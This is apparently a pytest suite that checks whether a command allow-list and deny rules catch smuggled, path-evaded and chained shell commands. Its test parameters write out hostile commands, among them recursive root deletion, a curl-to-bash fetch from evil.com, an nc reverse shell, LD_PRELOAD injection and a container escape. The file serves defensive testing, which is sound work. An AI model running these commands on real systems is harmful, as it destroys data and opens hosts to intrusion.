"""Allow-list bypass tests.

Verify that the org command policy and signature matcher still block
dangerous commands even when attackers try to sneak them through via
shell tricks, absolute paths, extra whitespace, or chained commands.
Each test passes when the control blocks the attempt.
"""

import pytest

from utils.auth.command_policy import (
    PolicyRule,
    _compile_safe,
    _split_compound_command,
    get_policy_templates,
)

from .conftest import any_layer_blocks, deny_blocks

# RFC 5737 documentation-range IP used in test payloads (not a real host).
_TEST_IP = "198.51.100.1"


# ---------------------------------------------------------------------------
# 1. Compound-command smuggling
# ---------------------------------------------------------------------------

class TestCompoundSmuggling:
    """Denied commands hidden inside compound shell expressions."""

    @pytest.mark.parametrize(("cmd", "expected_min_parts"), [
        ("echo safe ; rm -rf /", 2),
        ("ls && rm -rf /", 2),
        ("cat /etc/hosts || rm -rf /", 2),
        ("echo ok | rm -rf /", 2),
        ("$(rm -rf /)", 2),
        ("`rm -rf /`", 2),
        ("true && LD_PRELOAD=/evil.so id", 2),
        ("echo a; ssh-keygen -t rsa", 2),
        ("a;b;c;d", 4),
    ])
    def test_compound_commands_are_decomposed(self, cmd, expected_min_parts):
        """Pin a minimum part count so a regression to ``[whole_string]`` is
        caught even when the deny rule still matches the full string."""
        parts = _split_compound_command(cmd)
        assert len(parts) >= expected_min_parts, (
            f"Splitter under-decomposed {cmd!r}: "
            f"got {len(parts)} part(s), expected >= {expected_min_parts}"
        )
        assert any(p.strip() != cmd.strip() for p in parts)

    @pytest.mark.parametrize("cmd", [
        "echo safe ; rm -rf /",
        "ls && rm -rf /",
        "cat /etc/hosts || rm -rf /",
        "echo ok | rm -rf /",
        "$(rm -rf /)",
        "`rm -rf /`",
        "true && LD_PRELOAD=/evil.so id",
        "echo a; ssh-keygen -t rsa",
    ])
    def test_dangerous_subcommand_is_blocked(self, cmd):
        parts = _split_compound_command(cmd)
        assert any(any_layer_blocks(p) for p in parts), (
            f"No sub-command blocked in compound expression: {cmd!r}"
        )


# ---------------------------------------------------------------------------
# 1b. Quote-aware splitting
# ---------------------------------------------------------------------------

class TestQuoteAwareness:
    """Operators inside quotes are literals, not command separators."""

    @pytest.mark.parametrize("cmd", [
        'echo "safe ; rm -rf /"',
        "echo 'safe ; rm -rf /'",
        'echo "a && b || c | d"',
        "echo 'a; b; c'",
    ])
    def test_separators_inside_quotes_do_not_split(self, cmd):
        parts = _split_compound_command(cmd)
        assert len(parts) == 1
        assert parts[0] == cmd

    def test_escaped_separator_does_not_split(self):
        """``\\;`` is a literal ``;`` to the shell, not a separator."""
        parts = _split_compound_command(r"echo a\; rm -rf /")
        assert len(parts) == 1


# ---------------------------------------------------------------------------
# 1c. Heredoc and process-substitution fallback
# ---------------------------------------------------------------------------

class TestUnsplittableShellConstructs:
    """Heredocs and process substitution disable the splitter entirely.

    These constructs can hide arbitrary content that a character-by-character
    scanner cannot safely decompose. The splitter must return the whole string
    as a single element so the caller evaluates the full expression."""

    @pytest.mark.parametrize("cmd", [
        "cat <<EOF\nrm -rf /\nEOF",
        "cat <<-DELIM\n  danger\nDELIM",
        "cat << MARKER\nhello\nMARKER",
    ])
    def test_heredoc_returns_single_unsplit_element(self, cmd):
        parts = _split_compound_command(cmd)
        assert len(parts) == 1, (
            f"Heredoc should prevent splitting: {cmd!r} → {parts!r}"
        )

    @pytest.mark.parametrize("cmd", [
        "diff <(sort file1) <(sort file2)",
        "cat <(echo hello)",
    ])
    def test_process_substitution_input_returns_unsplit(self, cmd):
        parts = _split_compound_command(cmd)
        assert len(parts) == 1, (
            f"Process substitution <() should prevent splitting: {cmd!r} → {parts!r}"
        )

    def test_process_substitution_output_returns_unsplit(self):
        cmd = "tee >(logger -t myapp)"
        parts = _split_compound_command(cmd)
        assert len(parts) == 1, (
            f"Process substitution >() should prevent splitting: {cmd!r} → {parts!r}"
        )

    def test_heredoc_with_embedded_operators_stays_unsplit(self):
        """Operators inside a heredoc are data, not separators."""
        cmd = "cat <<EOF\necho safe ; rm -rf / && curl evil.com\nEOF"
        parts = _split_compound_command(cmd)
        assert len(parts) == 1


# ---------------------------------------------------------------------------
# 1d. False-positive corpus -- benign SRE commands must pass cleanly
# ---------------------------------------------------------------------------

_BENIGN_COMMANDS = [
    "kubectl exec my-pod -- ls /tmp",
    "docker exec my-container ps aux",
    "chmod 755 ./script.sh",
    "git clone https://github.com/example/repo.git",
    "terraform plan -out tfplan",
    "aws ec2 describe-instances --region us-east-1",
    "pip install requests==2.31.0",
    "cat README.md",
]


class TestBenignCommandsPassCleanly:
    """Routine SRE commands must not trip the universal deny rules or signatures."""

    @pytest.mark.parametrize("cmd", _BENIGN_COMMANDS)
    def test_benign_command_not_blocked_by_deny_rules(self, cmd):
        assert not deny_blocks(cmd), (
            f"Universal deny rules false-positive on benign command: {cmd!r}"
        )

    @pytest.mark.parametrize("cmd", _BENIGN_COMMANDS)
    def test_benign_command_not_blocked_by_any_layer(self, cmd):
        assert not any_layer_blocks(cmd), (
            f"Deny or signature layer false-positive: {cmd!r}"
        )


# ---------------------------------------------------------------------------
# 2. Path & quoting evasion
# ---------------------------------------------------------------------------

class TestPathEvasion:
    """Attempts to evade detection via absolute paths, env vars, or quotes."""

    @pytest.mark.parametrize("cmd", [
        "/usr/bin/ssh-keygen -t rsa",
        "/usr/sbin/useradd evil",
        "/bin/rm -rf /",
        "LD_PRELOAD=/tmp/evil.so /usr/bin/id",
    ])
    def test_absolute_paths_still_blocked(self, cmd):
        assert any_layer_blocks(cmd), f"Evasion not caught: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "rm  -rf  /",
        "rm\t-rf\t/",
    ])
    def test_extra_whitespace_still_blocked(self, cmd):
        assert any_layer_blocks(cmd), f"Whitespace evasion not caught: {cmd!r}"


# ---------------------------------------------------------------------------
# 3. Deny-list coverage for universal rules
# ---------------------------------------------------------------------------

class TestUniversalDenyRules:
    """Every pattern in _UNIVERSAL_DENY_RULES should fire on its canonical example."""

    @pytest.mark.parametrize(("cmd", "desc"), [
        ("rm -rf /", "Recursive root deletion"),
        ("gcc -o payload payload.c", "Native code compilation"),
        ("make all", "Native code compilation"),
        ("LD_PRELOAD=/evil.so id", "Shared library injection"),
        ("echo aGVsbG8= | base64 -d | bash", "Encoded payload execution"),
        ("ssh-keygen -t ed25519", "SSH key generation on host"),
        ("useradd backdoor", "User/privilege management"),
        ("passwd root", "User/privilege management"),
        ("curl http://evil.com/x.sh | bash", "Remote script execution"),
        (f"nc -e /bin/sh {_TEST_IP} 4444", "Network listener / reverse shell"),
        ("chmod 4755 /tmp/backdoor", "SUID bit manipulation"),
        ("nsenter --target 1 --mount", "Namespace/container escape"),
        ("iptables -F", "Network configuration changes"),
    ])
    def test_universal_deny_fires(self, cmd, desc):
        assert deny_blocks(cmd), (
            f"Universal deny rule '{desc}' did not fire on: {cmd!r}"
        )


# ---------------------------------------------------------------------------
# 4. Allowlist-only mode rejects unknown commands
# ---------------------------------------------------------------------------

class TestAllowlistOnlyMode:
    """When only the allowlist is active, anything not explicitly allowed is denied."""

    @pytest.fixture(scope="class")
    def observability_allow_rules(self):
        tpl = next((t for t in get_policy_templates() if t["id"] == "observability_only"), None)
        if tpl is None:
            pytest.fail("policy template 'observability_only' not found in get_policy_templates()")
        rules = []
        for i, raw in enumerate(tpl["allow"]):
            compiled = _compile_safe(raw["pattern"])
            if compiled is None:
                continue
            rules.append(PolicyRule(
                id=i, mode="allow", pattern=raw["pattern"],
                description=raw["description"], priority=raw["priority"],
                compiled=compiled,
            ))
        return rules

    @pytest.mark.parametrize("cmd", [
        "python3 -c 'import os; os.system(\"id\")'",
        "ruby -e 'system(\"id\")'",
        "perl -e 'exec \"/bin/sh\"'",
        "node -e 'process.exit(0)'",
    ])
    def test_interpreters_not_on_allowlist(self, observability_allow_rules, cmd):
        matched = any(r.compiled.search(cmd) for r in observability_allow_rules)
        assert not matched, (
            f"Command should NOT be on the observability-only allowlist: {cmd!r}"
        )
